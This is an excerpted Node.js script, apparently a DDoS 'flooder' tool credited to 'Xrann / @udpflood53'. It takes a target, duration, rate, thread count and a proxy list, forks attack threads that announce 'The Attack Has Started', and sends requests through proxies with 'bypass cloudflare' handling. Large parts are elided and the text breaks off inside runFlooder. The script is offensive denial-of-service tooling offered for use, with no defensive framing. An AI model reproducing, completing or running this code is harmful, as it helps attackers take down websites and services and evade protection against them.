 ...
 if (process.argv.length < 7){console.log(`node TLS.js target time rate(32) thread(2) proxy.txt`); process.exit();}
 const headers = {};
 ...
 const getCurrentTime = () => {
  ...
  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      ...
      console.log(`[\x1b[35mINFO\x1b[0m] ${getCurrentTime()} Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
    })
    .catch((error) => {
      if (error.message === 'Request timed out') {
        console.log(`[\x1b[35mINFO\x1b[0m] ${getCurrentTime()} Request Timed Out`);
      } else if (error.response) {
        const extractedTitle = getTitleFromHTML(error.response.data);
        console.log(`[\x1b[35mINFO\x1b[0m] ${getCurrentTime()} Title: ${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
      } else {
        console.log(`[\x1b[35mINFO\x1b[0m] ${getCurrentTime()} ${error.message}`);
      }
    });
}
...
if (cluster.isMaster){
  console.clear();
  console.log(`
  â–ˆâ–ˆâ–“ â–ˆâ–ˆâ–€â–ˆâ–ˆâ–ˆ   â–ˆ    â–ˆâ–ˆ  â–ˆâ–ˆ â–„â–ˆâ–€ â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  
  â–“â–ˆâ–ˆâ–’â–“â–ˆâ–ˆ â–’ â–ˆâ–ˆâ–’ â–ˆâ–ˆ  â–“â–ˆâ–ˆâ–’ â–ˆâ–ˆâ–„â–ˆâ–’ â–’â–ˆâ–ˆâ–’  â–ˆâ–ˆâ–’
  â–’â–ˆâ–ˆâ–’â–“â–ˆâ–ˆ â–‘â–„â–ˆ â–’â–“â–ˆâ–ˆ  â–’â–ˆâ–ˆâ–‘â–“â–ˆâ–ˆâ–ˆâ–„â–‘ â–’â–ˆâ–ˆâ–‘  â–ˆâ–ˆâ–’
  â–‘â–ˆâ–ˆâ–‘â–’â–ˆâ–ˆâ–€â–€â–ˆâ–„  â–“â–“â–ˆ  â–‘â–ˆâ–ˆâ–‘â–“â–ˆâ–ˆ â–ˆâ–„ â–’â–ˆâ–ˆ   â–ˆâ–ˆâ–‘
  â–‘â–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆâ–“ â–’â–ˆâ–ˆâ–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–“ â–’â–ˆâ–ˆâ–’ â–ˆâ–„â–‘ â–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘
...
`);
  console.log(`\x1b[96mSource code by Xrann / @udpflood53\x1b[0m`);
  for (let i = 1; i <= process.argv[5]; i++){
    cluster.fork();
    console.log(`[\x1b[35mDEBUG\x1b[0m] ${getCurrentTime()} Attack Thread ${i} Started`);
  }
  console.log(`[\x1b[35mDEBUG\x1b[0m] ${getCurrentTime()} The Attack Has Started`);
  setInterval(getStatus, 2000);
  setTimeout(() => {
    console.log(`[\x1b[35mDEBUG\x1b[0m] ${getCurrentTime()} The Attack Is Over`);
    process.exit(1);
  }, process.argv[3] * 1000);
} 
...
HTTP(options, callback) {
  ...
  connection.on("data", chunk => {
      ...
      if (isAlive === false) {
          connection.destroy();
          signature = "bypass cloudflare: invalid response from proxy server";
          return callback(undefined, signature);
      }
  ...
  connection.on("timeout", () => {
      connection.destroy();
      signature = "bypass cloudflare: timeout exceeded";
      return callback(undefined, signature);
  });

  connection.on("error", error => {
      connection.destroy();
      signature = "bypass cloudflare: " + error;
      return callback(undefined, signature);
  });
}
}
...
function runFlooder() {
  ...
  const proxyOptions = {
    ...
    headers: {
      "Proxy-Protocol": "HTTP/1.1",
      "Proxy-Connection": "Keep-Alive",
      "User-Agent": userAgentv2,
    },
    timeout: 25,
  };
  setTimeout(function () {
